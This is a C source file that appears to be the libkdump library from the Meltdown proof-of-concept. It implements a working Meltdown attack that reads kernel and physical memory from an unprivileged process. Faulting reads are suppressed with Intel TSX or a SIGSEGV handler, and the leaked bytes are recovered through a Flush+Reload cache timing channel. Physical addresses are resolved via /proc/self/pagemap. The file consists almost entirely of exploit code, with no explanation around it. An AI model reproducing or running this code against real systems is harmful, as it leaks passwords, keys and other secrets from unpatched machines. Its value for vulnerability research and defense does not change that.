#include "libkdump.h"
#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>

libkdump_config_t libkdump_auto_config = {0};

// ---------------------------------------------------------------------------
static volatile size_t run = 1;
static jmp_buf buf;

static char *_mem = NULL, *mem = NULL;
static pthread_t *load_thread;
static size_t phys = 0;
static int dbg = 0;

static libkdump_config_t config;

#ifndef ETIME
#define ETIME 62
#endif

#if defined(NO_TSX) && defined(FORCE_TSX)
#error NO_TSX and FORCE_TSX cannot be used together!
#endif

#if defined(__i386__) && defined(FORCE_TSX)
#undef FORCE_TSX
#warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
#endif

static __attribute__((always_inline)) void meltdown_nonull(void) {
  uint64_t byte;

retry:
  byte = *(volatile uint8_t*)phys;
  byte <<= 12;
  if (byte == 0) goto retry;

  *(volatile uint64_t*)(mem + byte);
}

static __attribute__((always_inline)) void meltdown_fast(void) {
  uint64_t byte;

  byte = *(volatile uint8_t*)phys;
  byte <<= 12;
  *(volatile uint64_t*)(mem + byte);
}

static __attribute__((always_inline)) void meltdown(void) {
  uint64_t byte;

retry:
  *(volatile uint64_t*)0;

  byte = *(volatile uint8_t*)phys;
  byte <<= 12;
  if (byte == 0) goto retry;

  *(volatile uint64_t*)(mem + byte);
}

#ifndef MELTDOWN
#define MELTDOWN meltdown_nonull()
#endif

// ---------------------------------------------------------------------------
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;

// ---------------------------------------------------------------------------
static void debug(d_sym_t symbol, const char *fmt, ...) {
  if (!dbg)
    return;

  switch (symbol) {
  case ERROR:
    printf("\x1b[31;1m[-]\x1b[0m ");
    break;
  case INFO:
    printf("\x1b[33;1m[.]\x1b[0m ");
    break;
  case SUCCESS:
    printf("\x1b[32;1m[+]\x1b[0m ");
    break;
  default:
    break;
  }
  va_list ap;
  va_start(ap, fmt);
  vfprintf(stdout, fmt, ap);
  va_end(ap);
}

// ---------------------------------------------------------------------------
static inline uint64_t rdtsc() {
  uint64_t a;
  uint32_t c;

#if defined(USE_RDTSCP)
  a = __rdtscp(&c);
#else
  _mm_mfence();
  a = __rdtsc();
  _mm_mfence();
#endif
  return a;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) void maccess(void *p) {
  *(volatile size_t*)p;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) void flush(void *p) {
  _mm_clflush(p);
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) flush_reload(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc();
  maccess(ptr);
  end = rdtsc();

  flush(ptr);

  if (end - start < config.cache_miss_threshold) {
    return 1;
  }
  return 0;
}

// ---------------------------------------------------------------------------
static void *nopthread(void *dummy) {
  while (1) {
    _mm_pause();
  }
}

// ---------------------------------------------------------------------------
static void *syncthread(void *dummy) {
  while (1) {
    sync();
  }
}

// ---------------------------------------------------------------------------
static void *yieldthread(void *dummy) {
  while (1) {
    sched_yield();
  }
}

#ifndef NO_TSX
// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
  return _xbegin();
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline void xend(void) {
  _xend();
}
#endif

// ---------------------------------------------------------------------------
size_t libkdump_virt_to_phys(size_t virtual_address) {
  static int pagemap = -1;
  if (pagemap == -1) {
    pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap < 0) {
      errno = EPERM;
      return 0;
    }
  }
  uint64_t value;
  int got = pread(pagemap, &value, 8, (virtual_address / 0x1000) * 8);
  if (got != 8) {
    errno = EPERM;
    return 0;
  }
  uint64_t page_frame_number = value & ((1ULL << 54) - 1);
  if (page_frame_number == 0) {
    errno = EPERM;
    return 0;
  }
  return page_frame_number * 0x1000 + virtual_address % 0x1000;
}

// ---------------------------------------------------------------------------
static int check_tsx() {
#if !defined(NO_TSX) && !defined(FORCE_TSX)
  if (__get_cpuid_max(0, NULL) >= 7) {
    unsigned a, b, c, d;
    __cpuid_count(7, 0, a, b, c, d);
    return (b & (1 << 11)) ? 1 : 0;
  } else
    return 0;
#else
#ifdef FORCE_TSX
  return 1;
#else
  return 0;
#endif
#endif
}

// ---------------------------------------------------------------------------
static void detect_fault_handling() {
  if (check_tsx()) {
    debug(SUCCESS, "Using Intel TSX\n");
    config.fault_handling = TSX;
  } else {
    debug(INFO, "No Intel TSX, fallback to signal handler\n");
    config.fault_handling = SIGNAL_HANDLER;
  }
}

// ---------------------------------------------------------------------------
static void detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  uint64_t start = 0, end = 0;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end - start);
  }
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end - start);
  }
  reload_time /= count;
  flush_reload_time /= count;

  debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
        flush_reload_time, reload_time);
  config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
  debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n",
        config.cache_miss_threshold);
}

// ---------------------------------------------------------------------------
static void auto_config() {
  debug(INFO, "Auto configuration\n");
  detect_fault_handling();
  detect_flush_reload_threshold();
  config.measurements = 3;
  config.accept_after = 1;
  config.load_threads = 1;
  config.load_type = NOP;
  config.retries = 10000;
  config.physical_offset = DEFAULT_PHYSICAL_OFFSET;
}

// ---------------------------------------------------------------------------
static int check_config() {
  if (config.cache_miss_threshold <= 0) {
    detect_flush_reload_threshold();
  }
  if (config.cache_miss_threshold <= 0) {
    errno = ETIME;
    return -1;
  }
  return 0;
}

// ---------------------------------------------------------------------------
static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_handler(int signum) {
  (void)signum;
  run = 0;
  unblock_signal(SIGSEGV);
  longjmp(buf, 0);
}

// ---------------------------------------------------------------------------
libkdump_config_t libkdump_get_autoconfig() {
  auto_config();
  return config;
}

// ---------------------------------------------------------------------------
int libkdump_init(const libkdump_config_t configuration) {
  int j;
  config = configuration;
  if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
    auto_config();
  }

  int err = check_config();
  if (err != 0) {
    errno = err;
    return -1;
  }
  _mem = malloc(4096 * 300);
  if (!_mem) {
    errno = ENOMEM;
    return -1;
  }
  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
  memset(mem, 0xab, 4096 * 290);

  for (j = 0; j < 256; j++) {
    flush(mem + j * 4096);
  }

  load_thread = malloc(sizeof(pthread_t) * config.load_threads);
  void *thread_func;
  switch (config.load_type) {
  case IO:
    thread_func = syncthread;
    break;
  case YIELD:
    thread_func = yieldthread;
    break;
  case NOP:
  default:
    thread_func = nopthread;
  }

  for (j = 0; j < config.load_threads; j++) {
    int r = pthread_create(&load_thread[j], 0, thread_func, 0);
    if (r != 0) {
      int k;
      for (k = 0; k < j; k++) {
        pthread_cancel(load_thread[k]);
        free(_mem);
      }
      errno = r;
      return -1;
    }
  }
  debug(SUCCESS, "Started %d load threads\n", config.load_threads);

  if (config.fault_handling == SIGNAL_HANDLER) {
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
      debug(ERROR, "Failed to setup signal handler\n");
      libkdump_cleanup();
      return -1;
    }
    debug(SUCCESS, "Successfully setup signal handler\n");
  }
  return 0;
}

// ---------------------------------------------------------------------------
int libkdump_cleanup() {
  int j;
  if (config.fault_handling == SIGNAL_HANDLER) {
    signal(SIGSEGV, SIG_DFL);
  }

  for (j = 0; j < config.load_threads; j++) {
    pthread_cancel(load_thread[j]);
  }
  free(load_thread);
  free(_mem);
  debug(SUCCESS, "Everything is cleaned up, good bye!\n");
  return 0;
}

// ---------------------------------------------------------------------------
size_t libkdump_phys_to_virt(size_t addr) {
  return addr + config.physical_offset;
}

// ---------------------------------------------------------------------------
void libkdump_enable_debug(int enable) { dbg = enable; }

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) read_value() {
  int i, hit = 0;
  for (i = 0; i < 256; i++) {
    if (flush_reload(mem + i * 4096)) {
      hit = i + 1;
    }
    sched_yield();
  }
  return hit - 1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
#ifndef NO_TSX
  size_t retries = config.retries + 1;
  uint64_t start = 0, end = 0;

  while (retries--) {
    if (xbegin() == _XBEGIN_STARTED) {
      MELTDOWN;
      xend();
    }
    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
#endif
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
  size_t retries = config.retries + 1;
  uint64_t start = 0, end = 0;

  while (retries--) {
    run = 1;
    setjmp(buf);
    if (run) {
      MELTDOWN;
    }

    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
  phys = addr;

  char res_stat[256];
  int i, j, r;
  for (i = 0; i < 256; i++)
    res_stat[i] = 0;

  sched_yield();

  for (i = 0; i < config.measurements; i++) {
    if (config.fault_handling == TSX) {
      r = libkdump_read_tsx();
    } else {
      r = libkdump_read_signal_handler();
    }
    res_stat[r]++;
  }
  int max_v = 0, max_i = 0;

  for (i = 1; i < 256; i++) {
    if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
      max_v = res_stat[i];
      max_i = i;
    }
  }
  return max_i;
}
